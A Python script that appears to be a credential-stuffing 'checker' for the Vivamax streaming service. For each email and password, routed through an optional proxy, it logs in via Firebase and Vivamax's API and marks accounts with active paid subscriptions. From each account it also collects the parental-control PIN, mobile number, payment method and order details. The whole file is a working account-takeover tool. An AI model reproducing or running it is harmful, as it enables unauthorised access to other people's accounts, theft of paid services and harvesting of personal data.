# vivamax_checker.py
import requests
from datetime import datetime
import os

# ============= DYNAMIC VIVAMAX PRODUCT CACHE =============
VIVAMAX_PRODUCTS = {}  # subscriptionId → plan info

VIVAMAX_FALLBACK_PLANS = {
    "one_month": {
        "title": "Vivamax Monthly",
        "price": "₱169.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "three_months_app": {
        "title": "Vivamax 3 Months (App)",
        "price": "₱419.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    "three_months": {
        "title": "Vivamax 3 Months",
        "price": "₱419.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    "six_months": {
        "title": "Vivamax 6 Months",
        "price": "₱769.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 1
    },
    "one_year": {
        "title": "Vivamax 1 Year",
        "price": "₱1,420.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    "one_month_max2": {
        "title": "Vivamax Max 2 - 1 Month",
        "price": "₱499.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "three_months_max2": {
        "title": "Vivamax Max 2 - 3 Months",
        "price": "₱1,350.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 2
    },
    "six_months_max2": {
        "title": "Vivamax Max 2 - 6 Months",
        "price": "₱2,490.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 2
    },
    "one_year_max2": {
        "title": "Vivamax Max 2 - 1 Year",
        "price": "₱4,790.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "three_months_max3": {
        "title": "Vivamax Max 3 - 3 Months",
        "price": "₱1,650.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 3
    },
    "six_months_max3": {
        "title": "Vivamax Max 3 - 6 Months",
        "price": "₱3,290.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 3
    },
    "one_year_max3": {
        "title": "Vivamax Max 3 - 1 Year",
        "price": "₱5,990.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 3
    },
    "six_months_max4": {
        "title": "Vivamax Max 4 - 6 Months",
        "price": "₱3,990.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 4
    },
    "one_year_max4": {
        "title": "Vivamax Max 4 - 1 Year",
        "price": "₱7,490.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 4
    },
    "maxone_bundle_ph_1month_web": {
        "title": "VMX+One PH - 1 Month",
        "price": "₱219.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "maxone_bundle_ph_1year_web": {
        "title": "VMX+One PH - 1 Year",
        "price": "₱1,890.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "maxone_bundle2_int_1month_web": {
        "title": "VMX+One Plan 2 - 1 Month",
        "price": "₱679.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "maxone_bundle2_int_1year_web": {
        "title": "VMX+One Plan 2 - 1 Year",
        "price": "₱6,390.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "vivaone_ph_one_month_no_ads_web": {
        "title": "Viva One - 1 Month",
        "price": "₱99.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "vivaone_ph_three_months_no_ads_web": {
        "title": "Viva One - 3 Months",
        "price": "₱269.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    "vivaone_ph_six_months_no_ads_web": {
        "title": "Viva One - 6 Months",
        "price": "₱499.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 1
    },
    "vivaone_ph_one_year_no_ads_web": {
        "title": "Viva One - 1 Year",
        "price": "₱949.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    "vivaone_max2_one_month_web": {
        "title": "Viva One Max 2 - 1 Month",
        "price": "₱379.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "vivaone_max2_three_months_web": {
        "title": "Viva One Max 2 - 3 Months",
        "price": "₱979.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 2
    },
    "vivaone_max2_six_months_web": {
        "title": "Viva One Max 2 - 6 Months",
        "price": "₱1,790.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 2
    },
    "vivaone_max2_one_year_web": {
        "title": "Viva One Max 2 - 1 Year",
        "price": "₱3,490.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "vivamax_max2_one_month_ph_web": {
        "title": "Vivamax Max 2 - 1 Month",
        "price": "₱199.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "vivaone_max2_one_month_ph_web": {
        "title": "Vivaone Max 2 - 1 Month",
        "price": "₱119.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "onemax_max2_bundle_ph_1month_web": {
        "title": "Viva Max+One Plan Max 2 - 1 Month",
        "price": "₱259.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "boxone_bundle_ph_1month_web": {
        "title": "Viva One+VMB - 1 Month",
        "price": "₱199.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "vmb_one_week_ph_web": {
        "title": "VMB - 1 Week",
        "price": "₱69.00",
        "duration": 1, "period": "week",
        "billing": "1 week", "concurrent_stream": 1
    },
    "vmb_one_month_ph_web": {
        "title": "VMB - 1 Month",
        "price": "₱169.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "vmb_one_year_ph_web": {
        "title": "VMB - 1 Year",
        "price": "₱1,420.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    "vivamax_one_week_ph_web": {
        "title": "Vivamax PH 1 Week",
        "price": "₱69.00",
        "duration": 7, "period": "day",
        "billing": "7 days", "concurrent_stream": 1
    },
}

async def load_vivamax_products():
    global VIVAMAX_PRODUCTS
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'x-appname': 'Vivamax/release-R60-6',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        print("🔄 Fetching Vivamax products from API...")
        resp = requests.get(
            'https://api2.vivamax.net/v1/product',
            headers=headers, timeout=20
        )
        resp.raise_for_status()

        data = resp.json()
        products = data.get('results', [])

        VIVAMAX_PRODUCTS.clear()

        # Load from API first
        for p in products:
            subs_id = p.get('subs_id')
            if subs_id:
                plan_data = {
                    "price": p.get('price', 'N/A'),
                    "billing": f"{p.get('duration', 0)} {p.get('period', 'month')}",
                    "package": p.get('package', 'Unknown'),
                    "title": p.get('title', 'Unknown Plan'),
                    "duration": p.get('duration', 0),
                    "period": p.get('period', 'month'),
                    "concurrent_stream": p.get('concurrent_stream', 1),
                }
                VIVAMAX_PRODUCTS[subs_id] = plan_data
                # Also store without _web suffix
                stripped = subs_id.replace('_web', '')
                if stripped != subs_id:
                    VIVAMAX_PRODUCTS[stripped] = plan_data

        # Merge fallback (only fills gaps, never overwrites API data)
        for subs_id, plan_data in VIVAMAX_FALLBACK_PLANS.items():
            if subs_id not in VIVAMAX_PRODUCTS:
                VIVAMAX_PRODUCTS[subs_id] = plan_data
            stripped = subs_id.replace('_web', '')
            if stripped not in VIVAMAX_PRODUCTS:
                VIVAMAX_PRODUCTS[stripped] = plan_data

        print(f"✅ Total plans in cache: {len(VIVAMAX_PRODUCTS)}")

    except Exception as e:
        print(f"❌ Failed to load from API, using fallback only: {e}")
        # If API fails entirely, still use fallback
        for subs_id, plan_data in VIVAMAX_FALLBACK_PLANS.items():
            VIVAMAX_PRODUCTS[subs_id] = plan_data
            stripped = subs_id.replace('_web', '')
            VIVAMAX_PRODUCTS[stripped] = plan_data
        print(f"✅ Loaded {len(VIVAMAX_PRODUCTS)} plans from fallback")

def check_vivamax(email: str, password: str, proxy_url=None):
    """Real Vivamax Checker - Improved status & expiry detection"""
    result = {
        'email': email, 
        'password': password,
        'success': False,
        'message': '',
        'email_verified': 'Yes',
        'account_creation': '',
        'plan': 'Unknown',
        'currency': 'PHP',
        'subscribable': 'False',
        'free_trial': 'False',
        'expiry': 'N/A',
        'active': 'False',
        'country': 'PH',
        'username': 'N/A',
        'plan_sub': 'Unknown',
        'max_streams': '1',
        'payment_method': 'N/A',
        'displayName': 'N/A',
        'status': 'Unknown',
        'days_left': 'N/A',
        'stars': '—',
        'auto_renew': '—',
        'price': 'N/A',
        'billing': 'N/A',
        'pin': 'N/A',
        'mobile': 'N/A',
        'subscription_start': 'N/A', 
        'last_updated': 'N/A',
        'register_location': 'N/A',
    }

    try:
        proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

        # === 1. Firebase Login ===
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://identity.vivamax.net',
            'referer': 'https://identity.vivamax.net/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }

        resp = requests.post(
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBEUyk0R5bNsi_FCdK-L4Ztz5OENMA6O_U",
            json={"email": email, "password": password, "returnSecureToken": True},
            headers=headers,
            proxies=proxies,
            timeout=20
        )

        if resp.status_code != 200:
            result['message'] = "Invalid email or password"
            return result

        id_token = resp.json().get("idToken")
        if not id_token:
            result['message'] = "Login failed"
            return result

        # === 2. Vivamax Login ===
        login_headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://vivamax.net',
            'referer': 'https://vivamax.net/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-appname': 'Vivamax/release-R60-6'
        }

        device_payload = {
            "idToken": id_token,
            "deviceType": "COMP",
            "modelNo": "20030107",
            "deviceName": "Win32",
            "deviceId": "-459410908",
            "serialNo": "-459410908"
        }

        viva_resp = requests.post(
            "https://api2.vivamax.net/v1/viva/login",
            json=device_payload,
            headers=login_headers,
            proxies=proxies,
            timeout=20
        )

        if viva_resp.status_code not in (200, 201):
            result['message'] = f"Login failed ({viva_resp.status_code})"
            return result

        data = viva_resp.json()

        # ====================== DEBUG (remove after confirming fix) ======================
        print(f"[DEBUG] subscriptionId={data.get('subscriptionId')} | "
              f"sub.subscriptionId={data.get('subscription', {}).get('subscriptionId')} | "
              f"status={data.get('subscriptionStatus')} | "
              f"sub.status={data.get('subscription', {}).get('status')}")
        # =================================================================================

        # === ROBUST EXTRACTION ===
        result['username'] = data.get("displayName", "N/A")
        result['displayName'] = result['username']

        # Better status detection (top level + nested)
        result['status'] = (
            data.get("subscriptionStatus") or 
            data.get("status") or 
            data.get("subscription", {}).get("status") or 
            "UNKNOWN"
        ).upper().strip()   # ← ADD .strip()

        result['pin'] = data.get("parentalControlPin", "N/A")
        result['mobile'] = data.get("mobileNumber", "N/A")
        result['country'] = data.get("subscriptionLocation", data.get("registerLocation", "PH"))

        # Account creation & last updated
        if data.get("createdAt"):
            try:
                created = datetime.fromisoformat(data["createdAt"].replace("Z", "+00:00"))
                result['account_creation'] = created.strftime("%Y-%m-%d")
            except:
                result['account_creation'] = data.get("createdAt", "N/A")

        if data.get("updatedAt"):
            try:
                updated = datetime.fromisoformat(data["updatedAt"].replace("Z", "+00:00"))
                result['last_updated'] = updated.strftime("%Y-%m-%d %H:%M")
            except:
                result['last_updated'] = data.get("updatedAt", "N/A")

        # ====================== IMPROVED PLAN EXTRACTION + REAL PRICE DETECTION ======================
        sub_data = data.get("subscription", {})

        # Get subscription ID from multiple possible locations
        subs_id = (
            data.get("subscriptionId") or
            sub_data.get("subscriptionId") or
            sub_data.get("planInfo", {}).get("subs_id") or
            "UNKNOWN"
        ).strip()

        # 1. Try official planInfo first (most accurate when present)
        plan_info = sub_data.get("planInfo", {})

        # 2. Smart fallback using our product cache
        if not plan_info or not plan_info.get("title"):
            plan_info = (
                VIVAMAX_PRODUCTS.get(subs_id) or
                VIVAMAX_PRODUCTS.get(subs_id.replace('_web', '')) or
                VIVAMAX_PRODUCTS.get(subs_id.replace('_app', '')) or
                VIVAMAX_FALLBACK_PLANS.get(subs_id) or
                VIVAMAX_FALLBACK_PLANS.get(subs_id.replace('_web', '')) or
                VIVAMAX_FALLBACK_PLANS.get(subs_id.replace('_app', '')) or
                {}
            )

        # 3. Try to extract price from other locations even if planInfo is missing
        if not plan_info or not plan_info.get("price") or plan_info.get("price") == "N/A":
            google_details = sub_data.get("googleSubscriptionDetails", {})
            paymongo = sub_data.get("paymongoSubscriptionDetails", {})
            
            price_candidates = [
                plan_info.get("price"),
                sub_data.get("price"),
                data.get("price"),
                google_details.get("price"),
                google_details.get("priceAmount"),
                paymongo.get("attributes", {}).get("amount"),
                paymongo.get("amount"),
            ]
            
            actual_price = next((p for p in price_candidates if p and str(p).strip() not in ["N/A", "None", ""]), None)
            
            if actual_price:
                plan_info["price"] = str(actual_price)
            
            # Try to get billing info too
            if not plan_info.get("billing"):
                billing_candidates = [
                    sub_data.get("billingCycle"),
                    google_details.get("billingInterval"),
                    data.get("billing"),
                ]
                billing = next((b for b in billing_candidates if b), None)
                if billing:
                    plan_info["billing"] = str(billing)

        # 4. Final safety net for truly unknown plans
        if not plan_info or not plan_info.get("title"):
            print(f"⚠️ [UNKNOWN PLAN DETECTED] subscriptionId = '{subs_id}'")
            plan_info = {
                "title": f"Custom Plan ({subs_id})",
                "price": plan_info.get("price", "N/A"),
                "billing": plan_info.get("billing", "N/A"),
                "concurrent_stream": plan_info.get("concurrent_stream", 1)
            }

        # Apply the final values to result
        result['plan'] = plan_info.get("title", subs_id)
        result['price'] = plan_info.get("price", "N/A")
        result['billing'] = plan_info.get("billing") or \
            f"{plan_info.get('duration', '')} {plan_info.get('period', '')}".strip() or "N/A"
        result['max_streams'] = str(plan_info.get("concurrent_stream", "1"))
        # ====================================================================================
        # Subscription Start
        start_ts = data.get("subscriptionStartTime")
        if start_ts:
            try:
                result['subscription_start'] = datetime.fromtimestamp(start_ts / 1000).strftime("%Y-%m-%d")
            except:
                pass

        # Personal info
        result['receive_promos'] = "Yes" if data.get("isReceive") else "No"
        result['device_type'] = data.get("deviceType", "N/A")
        result['device_name'] = data.get("deviceName", "N/A")
        result['email_verified'] = 'Yes' if data.get('email_verified') else 'No'
        result['register_location'] = data.get("registerLocation", "N/A")
        result['business_unit'] = data.get("business_unit", "N/A")
        result['sub_type'] = data.get("subscriptionType", "N/A")

        # From googleSubscriptionDetails inside subscription
        google_details = sub_data.get("googleSubscriptionDetails", {})
        result['currency'] = google_details.get("priceCurrencyCode", "N/A")
        result['order_id'] = google_details.get("orderId", "N/A")
        result['purchase_country'] = google_details.get("countryCode", "N/A")

        # Payment Method
        sub_type = data.get("subscriptionType", "").lower().strip()
        paymongo = sub_data.get("paymongoSubscriptionDetails", {})
        paymongo_type = paymongo.get("attributes", {}).get("type", "").strip()
        apple = sub_data.get("appleSubscriptionDetails", {})

        if paymongo_type:
            result['payment_method'] = paymongo_type.title()
        elif apple:
            result['payment_method'] = "Apple Store"
        elif sub_type == "google":
            result['payment_method'] = "Google Play"
        elif sub_type:
            result['payment_method'] = sub_type.title()
        else:
            result['payment_method'] = "N/A"

        # Auto Renew
        if google_details:
            result['auto_renew'] = "ON" if google_details.get("autoRenewing") else "OFF"
        elif apple:
            pending = apple.get("pending_renewal_info", [{}])[0]
            result['auto_renew'] = "ON" if pending.get("auto_renew_status") == "1" else "OFF"
        else:
            raw = data.get("autoRenew", data.get("auto_renew"))
            result['auto_renew'] = "ON" if raw else "OFF"

        # === FINAL DECISION: cross-check status + expiry ===
        status_upper = result['status']
        is_active = False
        message = ""
        days_left_int = -1

        expiry_ts = data.get("subscriptionExpiryTime")
        if expiry_ts:
            try:
                expiry_date = datetime.fromtimestamp(expiry_ts / 1000)
                days_left_int = (expiry_date - datetime.now()).days
                result['expiry'] = expiry_date.strftime("%Y-%m-%d")
                if days_left_int == 0:
                    result['days_left'] = "Expires Today"
                elif days_left_int > 0:
                    result['days_left'] = str(days_left_int)
                else:
                    result['days_left'] = "Expired"
            except:
                pass

        if status_upper in ["ACTIVE", "SUBSCRIBED"] and days_left_int >= 0:
            is_active = True
            message = "ACTIVE SUBSCRIPTION!"
        elif status_upper in ["ACTIVE", "SUBSCRIBED"] and days_left_int < 0:
            is_active = False
            message = "Subscription EXPIRED (status mismatch)"
        elif days_left_int >= 0 and status_upper not in ["CANCELLED"]:
            is_active = True
            message = "ACTIVE SUBSCRIPTION!"
        elif status_upper == "CANCELLED":
            is_active = False
            message = "Subscription Cancelled"
        else:
            message = "Valid account but no active plan"

        result['message'] = message
        result['active'] = 'Yes' if is_active else 'No'
        result['success'] = is_active

    except Exception as e:
        result['message'] = f"Error: {str(e)[:100]}"

    return result
